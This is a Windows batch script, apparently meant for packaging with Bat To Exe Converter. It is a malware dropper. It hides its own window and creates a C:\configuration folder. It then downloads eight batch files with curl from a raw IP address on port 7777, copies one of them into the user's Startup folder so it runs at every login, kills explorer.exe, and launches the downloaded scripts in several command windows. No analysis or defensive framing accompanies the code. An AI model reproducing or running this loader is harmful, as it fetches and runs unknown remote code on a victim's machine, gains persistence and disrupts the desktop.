::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN4rfZzP5oePLuQB6wjTep4hm1hfj84eDg5WeVyudgpU
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
cd C:\
mkdir configuration
cd C:\configuration
curl http://111.90.151.174:7777/hit.bat -O
curl http://111.90.151.174:7777/and.bat -O
curl http://111.90.151.174:7777/run.bat -O
curl http://111.90.151.174:7777/5201.bat -O
curl http://111.90.151.174:7777/kill.bat -O
curl http://111.90.151.174:7777/part1.bat -O
curl http://111.90.151.174:7777/part2.bat -O
curl http://111.90.151.174:7777/part3.bat -O
copy "C:\configuration\part1.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp" >nul
taskkill /F /IM explorer.exe
start cmd.exe /k "C:\configuration\5201.bat"
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
exit




